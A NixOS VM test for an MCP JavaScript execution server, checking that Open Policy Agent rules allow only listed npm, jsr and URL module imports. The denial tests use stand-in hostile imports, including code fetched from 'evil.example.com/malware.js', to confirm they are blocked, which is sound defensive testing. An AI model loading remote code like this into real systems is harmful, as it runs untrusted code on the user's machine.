{ pkgs, mcp-js, ... }:

let
  # ── Rego policy for module imports ──────────────────────────────────
  #
  # Allow specific npm/jsr/URL packages through esm.sh.
  # Deny everything else.

  modulePolicy = pkgs.writeText "module-policy.rego" ''
    package mcp.modules

    default allow = false

    allow if {
        input.specifier_type == "npm"
        npm_package_allowed
    }
    allow if {
        input.specifier_type == "jsr"
        jsr_package_allowed
    }
    allow if {
        input.specifier_type == "url"
        url_host_allowed
    }

    allowed_npm_packages := {
        "lodash-es",
        "uuid",
        "date-fns",
        "zod",
    }

    npm_package_allowed if {
        input.url_parsed.host == "esm.sh"
        some pkg in allowed_npm_packages
        startswith(input.url_parsed.path, sprintf("/%s", [pkg]))
    }

    allowed_jsr_packages := {
        "@luca/cases",
        "@std/path",
    }

    jsr_package_allowed if {
        input.url_parsed.host == "esm.sh"
        some pkg in allowed_jsr_packages
        startswith(input.url_parsed.path, sprintf("/jsr/%s", [pkg]))
    }

    allowed_url_hosts := {
        "esm.sh",
        "cdn.jsdelivr.net",
        "unpkg.com",
    }

    url_host_allowed if {
        allowed_url_hosts[input.url_parsed.host]
    }

    allowed_url_suffixes := {
        ".esm.sh",
    }

    url_host_allowed if {
        some suffix in allowed_url_suffixes
        endswith(input.url_parsed.host, suffix)
    }
  '';

  # Minimal fetch policy (required since --opa-url enables fetch too)
  fetchPolicy = pkgs.writeText "fetch-policy.rego" ''
    package mcp.fetch
    default allow = false
  '';

  # Minimal fs policy
  fsPolicy = pkgs.writeText "fs-policy.rego" ''
    package mcp.fs
    default allow = false
  '';
in

{
  name = "mcp-js-module-policy";

  nodes = {
    machine = { ... }: {

      # ── OPA server ───────────────────────────────────────────────────
      systemd.services.opa = {
        description = "Open Policy Agent";
        after = [ "network.target" ];
        wantedBy = [ "multi-user.target" ];
        serviceConfig = {
          ExecStart = "${pkgs.open-policy-agent}/bin/opa run --server --addr :8181 ${modulePolicy} ${fetchPolicy} ${fsPolicy}";
          Restart = "on-failure";
          DynamicUser = true;
        };
      };

      # ── mcp-default: external modules DISABLED ──────────────────────
      # No --allow-external-modules, no --opa-url
      systemd.services.mcp-default = {
        description = "MCP JS Server (modules disabled)";
        after = [ "network.target" ];
        wantedBy = [ "multi-user.target" ];
        serviceConfig = {
          ExecStart = "${mcp-js}/bin/server --node-id default --stateless --http-port 3001";
          Restart = "on-failure";
          DynamicUser = true;
        };
      };

      # ── mcp-opa-policy: external modules ENABLED with OPA policy ────
      systemd.services.mcp-opa-policy = {
        description = "MCP JS Server (modules + OPA policy)";
        after = [ "network.target" "opa.service" ];
        wantedBy = [ "multi-user.target" ];
        serviceConfig = {
          ExecStart = "${mcp-js}/bin/server --node-id opa-policy --stateless --http-port 3002 --allow-external-modules --opa-url http://localhost:8181 --opa-module-policy mcp/modules";
          Restart = "on-failure";
          DynamicUser = true;
        };
      };

      networking.firewall.allowedTCPPorts = [ 3001 3002 8181 ];
    };
  };

  testScript = ''
    import json
    import shlex
    import time

    machine.start()
    machine.wait_for_unit("opa.service")
    machine.wait_for_unit("mcp-default.service")
    machine.wait_for_unit("mcp-opa-policy.service")
    machine.wait_for_open_port(3001)
    machine.wait_for_open_port(3002)
    machine.wait_for_open_port(8181)

    def exec_js(base_url, code):
        """Execute JS code against a specific mcp-js instance.

        Returns a dict with keys: status, output (result or error).
        """
        body = json.dumps({"code": code})
        raw = machine.succeed(
            "curl -s -X POST " + base_url + "/api/exec "
            "-H 'Content-Type: application/json' "
            "-d " + shlex.quote(body)
        )
        submit_resp = json.loads(raw)
        exec_id = submit_resp["execution_id"]

        for _ in range(60):
            status_raw = machine.succeed(
                "curl -s " + base_url + "/api/executions/" + exec_id
            )
            status_resp = json.loads(status_raw)
            status = status_resp.get("status", "")
            if status in ("Completed", "completed"):
                return {
                    "status": "completed",
                    "output": status_resp.get("result", ""),
                }
            if status in ("Failed", "failed", "TimedOut", "Cancelled",
                          "timed_out", "cancelled"):
                return {
                    "status": "failed",
                    "output": status_resp.get("error", status),
                }
            time.sleep(0.5)

        raise Exception("Execution " + exec_id + " did not complete within 30s")

    DEFAULT_URL = "http://localhost:3001"
    OPA_URL = "http://localhost:3002"

    # ════════════════════════════════════════════════════════════════════
    # Tests on mcp-default (external modules DISABLED)
    # ════════════════════════════════════════════════════════════════════

    with subtest("should block npm import on default server"):
        result = exec_js(DEFAULT_URL,
            'import { camelCase } from "npm:lodash-es@4.17.21"; camelCase("hello_world");')
        assert result["status"] == "failed", \
            "Expected failed, got: " + str(result)
        assert "external module imports are disabled" in result["output"].lower(), \
            "Expected 'external module imports are disabled', got: " + result["output"]

    with subtest("should block jsr import on default server"):
        result = exec_js(DEFAULT_URL,
            'import { camelCase } from "jsr:@luca/cases@1.0.0"; camelCase("hello_world");')
        assert result["status"] == "failed", \
            "Expected failed, got: " + str(result)
        assert "external module imports are disabled" in result["output"].lower(), \
            "Expected 'external module imports are disabled', got: " + result["output"]

    with subtest("should block https URL import on default server"):
        result = exec_js(DEFAULT_URL,
            'import { camelCase } from "https://esm.sh/lodash-es@4.17.21"; camelCase("hello_world");')
        assert result["status"] == "failed", \
            "Expected failed, got: " + str(result)
        assert "external module imports are disabled" in result["output"].lower(), \
            "Expected 'external module imports are disabled', got: " + result["output"]

    with subtest("should execute plain JS on default server"):
        result = exec_js(DEFAULT_URL, "1 + 2;")
        assert result["status"] == "completed", \
            "Expected completed, got: " + str(result)
        assert result["output"] == "3", \
            "Expected '3', got: " + result["output"]

    # ════════════════════════════════════════════════════════════════════
    # Tests on mcp-opa-policy (external modules + OPA policy)
    # ════════════════════════════════════════════════════════════════════

    with subtest("should allow whitelisted npm package (lodash-es)"):
        result = exec_js(OPA_URL,
            'import camelCase from "npm:lodash-es@4.17.21/camelCase"; console.log(camelCase("hello_world"));')
        # If the package is successfully fetched, status=completed.
        # If there's a network issue fetching from esm.sh, status=failed but
        # the error should NOT be "denied by policy".
        if result["status"] == "completed":
            print("Whitelisted npm import succeeded")
        elif result["status"] == "failed":
            assert "denied by policy" not in result["output"], \
                "Whitelisted npm package should NOT be denied by policy, got: " + result["output"]
            print("Whitelisted npm import failed (network), but not by policy: " + result["output"])
        else:
            raise AssertionError("Unexpected status: " + str(result))

    with subtest("should deny non-whitelisted npm package"):
        result = exec_js(OPA_URL,
            'import evil from "npm:evil-package@1.0.0"; evil();')
        assert result["status"] == "failed", \
            "Expected failed, got: " + str(result)
        assert "denied by policy" in result["output"].lower(), \
            "Expected 'denied by policy', got: " + result["output"]

    with subtest("should deny non-whitelisted URL host"):
        result = exec_js(OPA_URL,
            'import foo from "https://evil.example.com/malware.js"; foo();')
        assert result["status"] == "failed", \
            "Expected failed, got: " + str(result)
        assert "denied by policy" in result["output"].lower(), \
            "Expected 'denied by policy', got: " + result["output"]

    with subtest("should execute plain JS on OPA policy server"):
        result = exec_js(OPA_URL, "1 + 2;")
        assert result["status"] == "completed", \
            "Expected completed, got: " + str(result)
        assert result["output"] == "3", \
            "Expected '3', got: " + result["output"]
  '';
}
